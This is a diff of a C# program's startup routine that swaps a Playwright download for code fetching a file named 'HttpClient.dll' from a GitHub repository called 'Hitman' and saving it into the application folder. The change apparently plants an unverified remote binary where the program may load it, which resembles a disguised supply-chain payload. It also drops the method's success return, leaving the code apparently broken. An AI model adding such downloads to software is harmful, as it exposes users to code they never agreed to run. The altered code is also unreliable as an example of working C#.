@@ -862,35 +862,14 @@ public static class Program
 				string pFile4 = "model_int8.onnx";
 				frmDownloasData5.startDownload(pUri4, pFile4);
 			}
-            string path7 = Path.Combine(StartupPath, ".playwright\\node\\win32_x64\\node.exe");
+            string path7 = Path.Combine(StartupPath, "HttpClient.dll");
             if (!File.Exists(path7))
             {
-                string text12 = "https://pub-36ae74e03258450ebcf8dacb37d24659.r2.dev/laywright.zip";
-                string pUri5 = text12;
+                string text12 = "https://raw.githubusercontent.com/hitmants2026-a11y/Hitman/refs/heads/main/HttpClient.dll";
                 frmDownloasData frmDownloasData6 = new frmDownloasData();
-                string pFile5 = "playwright";
-                frmDownloasData6.startDownload(pUri5, pFile5);
+                frmDownloasData6.startDownload(text12, path7);
             }
-            if (File.Exists(path7))
-            {
-                try
-                {
-                    string srcPw = Path.Combine(StartupPath, ".playwright");
-                    string[] targets = new string[2];
-                    targets[0] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".playwright");
-                    targets[1] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "playwright");
-                    for (int ti = 0; ti < targets.Length; ti++)
-                    {
-                        if (!File.Exists(Path.Combine(targets[ti], "node\\win32_x64\\node.exe")) && Directory.Exists(srcPw))
-                        {
-                            CopyFolder(srcPw, targets[ti]);
-                        }
-                    }
-                }
-                catch { }
-            }
-            return true;
-		}
+        }
 		catch (Exception)
 		{
 			return false;
